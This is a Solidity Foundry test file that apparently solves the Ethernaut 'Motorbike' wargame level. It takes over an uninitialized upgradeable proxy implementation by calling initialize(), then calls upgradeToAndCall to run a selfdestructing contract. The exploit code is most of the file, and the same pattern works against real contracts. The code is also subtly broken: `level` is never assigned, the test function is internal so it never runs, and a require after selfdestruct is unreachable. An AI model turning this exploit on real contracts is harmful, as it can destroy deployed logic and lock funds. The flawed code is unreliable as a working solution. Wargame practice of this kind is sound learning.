// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/console.sol";

import {Test} from "forge-std/Test.sol";
import {Level} from "../src/core/BaseLevel.sol";
import {Ethernaut} from "../src/core/Ethernaut.sol";

import {MotorbikeFactory} from "../src/levels/25-MotorbikeFactory.sol";
import {Motorbike, Engine} from "../src/levels/25-Motorbike.sol";

contract Destructor {
  bytes32 public slot1;
  bytes32 public slot2;
  function kms() external {
    console.logBytes32(slot1);
    console.logBytes32(slot2);
    selfdestruct(payable(address(0)));
    require(false, "booo");
  }
}

contract MotorbikeSolution is Test {
    Ethernaut internal ethernaut;
    address payable internal levelFactory;
    address internal attacker = address(1337);
    address payable internal level;

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether/10);

        levelFactory = payable(address(new MotorbikeFactory()));
        ethernaut.registerLevel(Level(address(levelFactory)));
        vm.startPrank(attacker, attacker);
        bytes32 slot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        Motorbike bike = Motorbike(level);
        Engine engine = Engine(address(bytes20(vm.load(address(bike), slot) << 12*8)));
        engine.initialize();
        Destructor destructor = new Destructor();
        engine.upgradeToAndCall(
          address(destructor),
          abi.encodePacked(Destructor.kms.selector)
        );
    }

    function testSolution() internal {
        bool isLevelSuccessfullyPassed = ethernaut.submitLevelInstance(level);
        vm.stopPrank();
        assert(isLevelSuccessfullyPassed);
    }
}
